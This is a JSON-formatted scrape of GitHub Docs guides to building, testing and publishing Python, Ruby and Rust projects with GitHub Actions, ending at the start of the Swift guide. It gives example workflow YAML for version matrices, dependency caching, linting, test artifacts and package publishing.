          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Python application\".",
          "On the \"Python application\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the Python version.",
          "ClickCommit changes.Thepython-app.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a Python version"
      },
      {
        "type": "paragraph",
        "text": "To use a pre-installed version of Python or PyPy on a GitHub-hosted runner, use thesetup-pythonaction. This action finds a specific version of Python or PyPy from the tools cache on each runner and adds the necessary binaries toPATH, which persists for the rest of the job. If a specific version of Python is not pre-installed in the tools cache, thesetup-pythonaction will download and set up the appropriate version from thepython-versionsrepository."
      },
      {
        "type": "paragraph",
        "text": "Using thesetup-pythonaction is the recommended way of using Python with GitHub Actions because it ensures consistent behavior across different runners and different versions of Python. If you are using a self-hosted runner, you must install Python and add it toPATH. For more information, see thesetup-pythonaction."
      },
      {
        "type": "paragraph",
        "text": "The table below describes the locations for the tools cache in each GitHub-hosted runner."
      },
      {
        "type": "paragraph",
        "text": "If you are using a self-hosted runner, you can configure the runner to use thesetup-pythonaction to manage your dependencies. For more information, seeusing setup-python with a self-hosted runnerin thesetup-pythonREADME."
      },
      {
        "type": "paragraph",
        "text": "GitHub supports semantic versioning syntax. For more information, seeUsing semantic versioningand theSemantic versioning specification."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple Python versions"
      },
      {
        "type": "paragraph",
        "text": "The following example uses a matrix for the job to set up multiple Python versions. For more information, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"pypy3.10\", \"3.9\", \"3.10\", \"3.11\", \"3.12\", \"3.13\"]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      # You can test your matrix by printing the current Python version\n      - name: Display Python version\n        run: python -c \"import sys; print(sys.version)\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a specific Python version"
      },
      {
        "type": "paragraph",
        "text": "You can configure a specific version of Python. For example, 3.12. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest minor release of Python 3."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        # This is the version of the action for setting up Python, not the Python version.\n        uses: actions/setup-python@v5\n        with:\n          # Semantic version range syntax or exact version of a Python version\n          python-version: '3.x'\n          # Optional - x64 or x86 architecture, defaults to x64\n          architecture: 'x64'\n      # You can test your matrix by printing the current Python version\n      - name: Display Python version\n        run: python -c \"import sys; print(sys.version)\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Excluding a version"
      },
      {
        "type": "paragraph",
        "text": "If you specify a version of Python that is not available,setup-pythonfails with an error such as:##[error]Version 3.7 with arch x64 not found. The error message includes the available versions."
      },
      {
        "type": "paragraph",
        "text": "You can also use theexcludekeyword in your workflow if there is a configuration of Python that you do not wish to run. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        python-version: [\"3.9\", \"3.11\", \"3.13\", \"pypy3.10\"]\n        exclude:\n          - os: macos-latest\n            python-version: \"3.11\"\n          - os: windows-latest\n            python-version: \"3.11\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using the default Python version"
      },
      {
        "type": "paragraph",
        "text": "We recommend usingsetup-pythonto configure the version of Python used in your workflows because it helps make your dependencies explicit. If you don't usesetup-python, the default version of Python set inPATHis used in any shell when you callpython. The default version of Python varies between GitHub-hosted runners, which may cause unexpected changes or use an older version than expected."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have the pip package manager installed. You can use pip to install dependencies from the PyPI package registry before building and testing your code. For example, the YAML below installs or upgrades thepippackage installer and thesetuptoolsandwheelpackages."
      },
      {
        "type": "paragraph",
        "text": "You can also cache dependencies to speed up your workflow. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Set up Python\n  uses: actions/setup-python@v5\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: python -m pip install --upgrade pip setuptools wheel"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requirements file"
      },
      {
        "type": "paragraph",
        "text": "After you updatepip, a typical next step is to install dependencies fromrequirements.txt. For more information, seepip."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Set up Python\n  uses: actions/setup-python@v5\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: |\n    python -m pip install --upgrade pip\n    pip install -r requirements.txt"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching Dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache and restore the dependencies using thesetup-pythonaction."
      },
      {
        "type": "paragraph",
        "text": "The following example caches dependencies for pip."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- uses: actions/setup-python@v5\n  with:\n    python-version: '3.12'\n    cache: 'pip'\n- run: pip install -r requirements.txt\n- run: pip test"
      },
      {
        "type": "paragraph",
        "text": "By default, thesetup-pythonaction searches for the dependency file (requirements.txtfor pip,Pipfile.lockfor pipenv orpoetry.lockfor poetry) in the whole repository. For more information, seeCaching packages dependenciesin thesetup-pythonREADME."
      },
      {
        "type": "paragraph",
        "text": "If you have a custom requirement or need finer controls for caching, you can use thecacheaction. Pip caches dependencies in different locations, depending on the operating system of the runner. The path you'll need to cache may differ from the Ubuntu example above, depending on the operating system you use. For more information, seePython caching examplesin thecacheaction repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Testing with pytest and pytest-cov"
      },
      {
        "type": "paragraph",
        "text": "This example installs or upgradespytestandpytest-cov. Tests are then run and output in JUnit format while code coverage results are output in Cobertura. For more information, seeJUnitandCobertura."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Set up Python\n  uses: actions/setup-python@v5\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: |\n    python -m pip install --upgrade pip\n    pip install -r requirements.txt\n- name: Test with pytest\n  run: |\n    pip install pytest pytest-cov\n    pytest tests.py --doctest-modules --junitxml=junit/test-results.xml --cov=com --cov-report=xml --cov-report=html"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Ruff to lint and/or format code"
      },
      {
        "type": "paragraph",
        "text": "The following example installs or upgradesruffand uses it to lint all files. For more information, seeRuff."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Set up Python\n  uses: actions/setup-python@v5\n  with:\n    python-version: '3.x'\n- name: Install the code linting and formatting tool Ruff\n  run: pipx install ruff\n- name: Lint code with Ruff\n  run: ruff check --output-format=github --target-version=py39\n- name: Check code formatting with Ruff\n  run: ruff format --diff --target-version=py39\n  continue-on-error: true"
      },
      {
        "type": "paragraph",
        "text": "The formatting step hascontinue-on-error: trueset. This will keep the workflow from failing if the formatting step doesn't succeed. Once you've addressed all of the formatting errors, you can remove this option so the workflow will catch new issues."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running tests with tox"
      },
      {
        "type": "paragraph",
        "text": "With GitHub Actions, you can run tests with tox and spread the work across multiple jobs. You'll need to invoke tox using the-e pyoption to choose the version of Python in yourPATH, rather than specifying a specific version. For more information, seetox."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python: [\"3.9\", \"3.11\", \"3.13\"]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python }}\n      - name: Install tox and any other packages\n        run: pip install tox\n      - name: Run tox\n        # Run tox using the version of Python in `PATH`\n        run: tox -e py"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "You can upload artifacts to view after a workflow completes. For example, you may need to save log files, core dumps, test results, or screenshots. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how you can use theupload-artifactaction to archive test results from runningpytest. For more information, see theupload-artifactaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"3.9\", \"3.10\", \"3.11\", \"3.12\", \"3.13\"]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Python # Set Python version\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      # Install pip and pytest\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install pytest\n      - name: Test with pytest\n        run: pytest tests.py --doctest-modules --junitxml=junit/test-results-${{ matrix.python-version }}.xml\n      - name: Upload pytest test results\n        uses: actions/upload-artifact@v4\n        with:\n          name: pytest-results-${{ matrix.python-version }}\n          path: junit/test-results-${{ matrix.python-version }}.xml\n        # Use always() to always run this step to publish test results when there are test failures\n        if: ${{ always() }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing to PyPI"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflow to publish your Python package to PyPI once your CI tests pass. This section demonstrates how you can use GitHub Actions to upload your package to PyPI each time you publish a release. For more information, seeManaging releases in a repository."
      },
      {
        "type": "paragraph",
        "text": "The example workflow below usesTrusted Publishingto authenticate with PyPI, eliminating the need for a manually configured API token."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Upload Python Package\n\non:\n  release:\n    types: [published]\n\npermissions:\n  contents: read\n\njobs:\n  release-build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.x\"\n\n      - name: Build release distributions\n        run: |\n          # NOTE: put your own distribution build steps here.\n          python -m pip install build\n          python -m build\n\n      - name: Upload distributions\n        uses: actions/upload-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n  pypi-publish:\n    runs-on: ubuntu-latest\n\n    needs:\n      - release-build\n\n    permissions:\n      # IMPORTANT: this permission is mandatory for trusted publishing\n      id-token: write\n\n    # Dedicated environments with protections for publishing are strongly recommended.\n    environment:\n      name: pypi\n      # OPTIONAL: uncomment and update to include your PyPI project URL in the deployment status:\n      # url: https://pypi.org/p/YOURPROJECT\n\n    steps:\n      - name: Retrieve release distributions\n        uses: actions/download-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n      - name: Publish release distributions to PyPI\n        uses: pypa/gh-action-pypi-publish@6f7e8d9c0b1a2c3d4e5f6a7b8c9d0e1f2a3b4c5d"
      },
      {
        "type": "paragraph",
        "text": "For more information about this workflow, including the PyPI settings\nneeded, seeConfiguring OpenID Connect in PyPI."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a continuous integration (CI) workflow that builds and tests a Ruby application. If your CI tests pass, you may want to deploy your code or publish a gem."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Ruby, YAML, workflow configuration options, and how to create a workflow file. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Learn GitHub Actions",
          "Ruby in 20 minutes"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Ruby workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Ruby that should work for most Ruby projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"ruby\".",
          "Filter the selection of workflows by clickingContinuous integration.",
          "On the \"Ruby\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the Ruby versions you want to use.NoteThis workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, seeSecurity hardening for GitHub Actions.",
          "This workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.",
          "If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, seeSecurity hardening for GitHub Actions.",
          "ClickCommit changes.Theruby.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying the Ruby version"
      },
      {
        "type": "paragraph",
        "text": "The easiest way to specify a Ruby version is by using theruby/setup-rubyaction provided by the Ruby organization on GitHub. The action adds any supported Ruby version toPATHfor each job run in a workflow. For more information and available Ruby versions, seeruby/setup-ruby."
      },
      {
        "type": "paragraph",
        "text": "Using Ruby'sruby/setup-rubyaction is the recommended way of using Ruby with GitHub Actions because it ensures consistent behavior across different runners and different versions of Ruby."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-rubyaction takes a Ruby version as an input and configures that version on the runner."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1' # Not needed with a .ruby-version file\n- run: bundle install\n- run: bundle exec rake"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can check a.ruby-versionfile into the root of your repository andsetup-rubywill use the version defined in that file."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing with multiple versions of Ruby"
      },
      {
        "type": "paragraph",
        "text": "You can add a matrix strategy to run your workflow with more than one version of Ruby. For example, you can test your code against the latest patch releases of versions 3.1, 3.0, and 2.7."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    ruby-version: ['3.1', '3.0', '2.7']"
      },
      {
        "type": "paragraph",
        "text": "Each version of Ruby specified in theruby-versionarray creates a job that runs the same steps. The${{ matrix.ruby-version }}context is used to access the current job's version. For more information about matrix strategies and contexts, seeWorkflow syntax for GitHub ActionsandAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "The full updated workflow with a matrix strategy could look like this:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Ruby CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        ruby-version: ['3.1', '3.0', '2.7']\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Ruby ${{ matrix.ruby-version }}\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: ${{ matrix.ruby-version }}\n      - name: Install dependencies\n        run: bundle install\n      - name: Run tests\n        run: bundle exec rake"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies with Bundler"
      },
      {
        "type": "paragraph",
        "text": "Thesetup-rubyaction will automatically install bundler for you. The version is determined by yourgemfile.lockfile. If no version is present in your lockfile, then the latest compatible version will be installed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1'\n- run: bundle install"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "Thesetup-rubyactions provides a method to automatically handle the caching of your gems between runs."
      },
      {
        "type": "paragraph",
        "text": "To enable caching, set the following."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    bundler-cache: true"
      },
      {
        "type": "paragraph",
        "text": "This will configure bundler to install your gems tovendor/cache. For each successful run of your workflow, this folder will be cached by GitHub Actions and re-downloaded for subsequent workflow runs. A hash of yourgemfile.lockand the Ruby version are used as the cache key. If you install any new gems, or change a version, the cache will be invalidated and bundler will do a fresh install."
      },
      {
        "type": "paragraph",
        "text": "Caching without setup-ruby"
      },
      {
        "type": "paragraph",
        "text": "For greater control over caching, you can use theactions/cacheaction directly. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/cache@v4\n  with:\n    path: vendor/bundle\n    key: ${{ runner.os }}-gems-${{ hashFiles('**/Gemfile.lock') }}\n    restore-keys: |\n      ${{ runner.os }}-gems-\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3"
      },
      {
        "type": "paragraph",
        "text": "If you're using a matrix build, you will want to include the matrix variables in your cache key. For example, if you have a matrix strategy for different ruby versions (matrix.ruby-version) and different operating systems (matrix.os), your workflow steps might look like this:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/cache@v4\n  with:\n    path: vendor/bundle\n    key: bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-${{ hashFiles('**/Gemfile.lock') }}\n    restore-keys: |\n      bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Matrix testing your code"
      },
      {
        "type": "paragraph",
        "text": "The following example matrix tests all stable releases and head versions of MRI, JRuby and TruffleRuby on Ubuntu and macOS."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Matrix Testing\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n    runs-on: ${{ matrix.os }}-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu, macos]\n        ruby: [2.5, 2.6, 2.7, head, debug, jruby, jruby-head, truffleruby, truffleruby-head]\n    continue-on-error: ${{ endsWith(matrix.ruby, 'head') || matrix.ruby == 'debug' }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: ${{ matrix.ruby }}\n      - run: bundle install\n      - run: bundle exec rake"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Linting your code"
      },
      {
        "type": "paragraph",
        "text": "The following example installsrubocopand uses it to lint all files. For more information, seeRuboCop. You canconfigure Rubocopto decide on the specific linting rules."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Linting\n\non: [push]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n      - name: Rubocop\n        run: rubocop -f github"
      },
      {
        "type": "paragraph",
        "text": "Specifying-f githubmeans that the RuboCop output will be in GitHub's annotation format. Any linting errors will show inline in theFiles changedtab of the pull request that introduces them."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing Gems"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflow to publish your Ruby package to any package registry you'd like when your CI tests pass."
      },
      {
        "type": "paragraph",
        "text": "You can store any access tokens or credentials needed to publish your package using repository secrets. The following example creates and publishes a package toGitHub Package RegistryandRubyGems."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Ruby Gem\n\non:\n  # Manually publish\n  workflow_dispatch:\n  # Alternatively, publish whenever changes are merged to the `main` branch.\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    name: Build + Publish\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Ruby 2.6\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n\n      - name: Publish to GPR\n        run: |\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:github: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push --KEY github --host https://rubygems.pkg.github.com/${OWNER} *.gem\n        env:\n          GEM_HOST_API_KEY: \"Bearer ${{secrets.GITHUB_TOKEN}}\"\n          OWNER: ${{ github.repository_owner }}\n\n      - name: Publish to RubyGems\n        run: |\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:rubygems_api_key: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push *.gem\n        env:\n          GEM_HOST_API_KEY: \"${{secrets.RUBYGEMS_AUTH_TOKEN}}\""
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to build, test, and publish a Rust package."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Rust. For a full list of up-to-date software and the preinstalled versions of Rust, seeAbout GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of the Rust language. For more information, seeGetting started with Rust."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Rust workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a Rust workflow template that should work for most basic Rust projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Rust\".",
          "Filter the selection of workflows by clickingContinuous integration.",
          "On the \"Rust - by GitHub Actions\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the version of Rust.",
          "ClickCommit changes.Therust.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a Rust version"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners include a recent version of the Rust toolchain. You can use rustup to report on the version installed on a runner, override the version, and to install different toolchains. For more information, seeThe rustup book."
      },
      {
        "type": "paragraph",
        "text": "This example shows steps you could use to setup your runner environment to use the nightly build of rust and to report the version."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Temporarily modify the rust toolchain version\n        run: rustup override set nightly\n      - name: Output rust version for educational purposes\n        run: rustup --version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache and restore dependencies using the Cache action. This example assumes that your repository contains aCargo.lockfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Cache\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            target\n          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}"
      },
      {
        "type": "paragraph",
        "text": "If you have custom requirements or need finer controls for caching, you should explore other configuration options for thecacheaction. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to usecargo buildandcargo testin a job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        BUILD_TARGET: [release] # refers to a cargo profile\n    outputs:\n      release_built: ${{ steps.set-output.outputs.release_built }}\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build binaries in \"${{ matrix.BUILD_TARGET }}\" mode\n        run: cargo build --profile ${{ matrix.BUILD_TARGET }}\n      - name: Run tests in \"${{ matrix.BUILD_TARGET }}\" mode\n        run: cargo test --profile ${{ matrix.BUILD_TARGET }}"
      },
      {
        "type": "paragraph",
        "text": "Thereleasekeyword used in this example corresponds to a cargo profile. You can use anyprofileyou have defined in yourCargo.tomlfile."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing your package or library to crates.io"
      },
      {
        "type": "paragraph",
        "text": "Once you have setup your workflow to build and test your code, you can use a secret to login tocrates.ioand publish your package."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Login into crates.io\n        run: cargo login ${{ secrets.CRATES_IO }}\n      - name: Build binaries in \"release\" mode\n        run: cargo build -r\n      - name: \"Package for crates.io\"\n        run: cargo package # publishes a package as a tarball\n      - name: \"Publish to crates.io\"\n        run: cargo publish # publishes your crate as a library that can be added as a dependency"
      },
      {
        "type": "paragraph",
        "text": "If there are any errors building and packaging the crate, check the metadata in your manifest,Cargo.tomlfile, seeThe Manifest Format. You should also check yourCargo.lockfile, seeCargo.toml vs Cargo.lock."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After a workflow completes, you can upload the resulting artifacts for analysis or to use in another workflow. You could add these example steps to the workflow to upload an application for use by another workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Upload release artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: <my-app>\n          path: target/${{ matrix.BUILD_TARGET }}/<my-app>"
      },
      {
        "type": "paragraph",
        "text": "To use the uploaded artifact in a different job, ensure your workflows have the right permissions for the repository, seeAutomatic token authentication. You could use these example steps to download the app created in the previous workflow and publish it on GitHub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- uses: actions/checkout@v4\n      - name: Download release artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: <my-app>\n          path: ./<my-app>\n      - name: Publish built binary to GitHub releases\n      - run: |\n          gh release create --generate-notes ./<my-app>/<my-project>#<my-app>"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to build and test a Swift package."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with preinstalled software, and the Ubuntu and macOS runners include the dependencies for building Swift packages. For a full list of up-to-date software and the preinstalled versions of Swift and Xcode, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
